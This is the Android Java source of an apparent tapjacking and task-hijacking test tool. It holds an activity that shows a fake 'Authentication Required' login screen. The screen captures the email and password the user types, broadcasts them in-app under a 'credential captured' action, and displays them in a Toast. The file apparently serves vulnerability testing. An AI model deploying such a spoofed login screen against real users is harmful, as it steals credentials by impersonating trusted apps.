package com.mobiscan.tapjacktester;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Fake login activity used for task hijacking tests TH-02 and TH-05.
 * Designed to mimic a real login screen to test if user can be tricked.
 * Uses task affinity manipulation to reparent into attacker's task.
 */
public class TaskHijackLoginActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Make this activity appear as a legitimate login screen
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER_HORIZONTAL);
        layout.setPadding(80, 120, 80, 80);
        layout.setBackgroundColor(0xFFFFFFFF);

        // Header
        TextView header = new TextView(this);
        header.setText("🔐 Authentication Required");
        header.setTextSize(24);
        header.setTextColor(0xFF212121);
        header.setGravity(android.view.Gravity.CENTER);
        layout.addView(header);

        TextView subtitle = new TextView(this);
        subtitle.setText("Please sign in to continue");
        subtitle.setTextSize(14);
        subtitle.setTextColor(0xFF757575);
        subtitle.setGravity(android.view.Gravity.CENTER);
        subtitle.setPadding(0, 10, 0, 40);
        layout.addView(subtitle);

        // Username
        TextView userLabel = new TextView(this);
        userLabel.setText("Email");
        userLabel.setTextSize(12);
        userLabel.setTextColor(0xFF424242);
        layout.addView(userLabel);

        EditText usernameInput = new EditText(this);
        usernameInput.setHint("your@email.com");
        usernameInput.setInputType(android.text.InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
        usernameInput.setTextSize(16);
        usernameInput.setPadding(20, 20, 20, 20);
        layout.addView(usernameInput);

        // Password
        TextView passLabel = new TextView(this);
        passLabel.setText("Password");
        passLabel.setTextSize(12);
        passLabel.setTextColor(0xFF424242);
        passLabel.setPadding(0, 20, 0, 0);
        layout.addView(passLabel);

        EditText passwordInput = new EditText(this);
        passwordInput.setHint("••••••••");
        passwordInput.setInputType(android.text.InputType.TYPE_CLASS_TEXT |
                android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
        passwordInput.setTextSize(16);
        passwordInput.setPadding(20, 20, 20, 20);
        layout.addView(passwordInput);

        // Login button
        Button loginBtn = new Button(this);
        loginBtn.setText("Sign In");
        loginBtn.setBackgroundColor(0xFF2196F3);
        loginBtn.setTextColor(0xFFFFFFFF);
        loginBtn.setTextSize(16);
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 30, 0, 0);
        loginBtn.setLayoutParams(btnParams);

        loginBtn.setOnClickListener(v -> {
            String user = usernameInput.getText().toString();
            String pass = passwordInput.getText().toString();

            // CRITICAL: Capture the credentials and exfiltrate
            Intent exfilIntent = new Intent("com.mobiscan.CREDENTIAL_CAPTURED");
            exfilIntent.putExtra("username", user);
            exfilIntent.putExtra("password", pass);
            exfilIntent.putExtra("source", "task_hijack_login");
            exfilIntent.putExtra("target", getIntent().getStringExtra("target_package"));
            exfilIntent.setPackage(getPackageName());
            sendBroadcast(exfilIntent);

            // Also send via deep link for callback capture
            Intent deepLink = new Intent(Intent.ACTION_VIEW,
                    android.net.Uri.parse("tapjack://results?source=task_hijack&" +
                            "user=" + user + "&captured=true"));
            startActivity(deepLink);

            Toast.makeText(this,
                    "⚠️ CAPTURED: " + user + " / " + pass,
                    Toast.LENGTH_LONG).show();

            // Show attacker confirmation
            TextView result = new TextView(this);
            result.setText("✅ Credentials captured!\n\n" +
                    "This proves the target app is vulnerable\nto task hijacking credential theft.");
            result.setTextSize(16);
            result.setTextColor(0xFF00E676);
            result.setGravity(android.view.Gravity.CENTER);
            result.setPadding(0, 30, 0, 0);
            layout.addView(result);

            loginBtn.setEnabled(false);
            loginBtn.setText("Captured ✓");
            loginBtn.setBackgroundColor(0xFF4CAF50);
        });

        layout.addView(loginBtn);

        // Task info footer
        TextView footer = new TextView(this);
        footer.setText("Task ID: " + getTaskId() + "\n" +
                "Launch Mode: standard | allowTaskReparenting: true");
        footer.setTextSize(10);
        footer.setTextColor(0xFF9E9E9E);
        footer.setGravity(android.view.Gravity.CENTER);
        footer.setPadding(0, 30, 0, 0);
        layout.addView(footer);

        setContentView(layout);

        // Keep this activity alive for task hijacking
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
    }
}
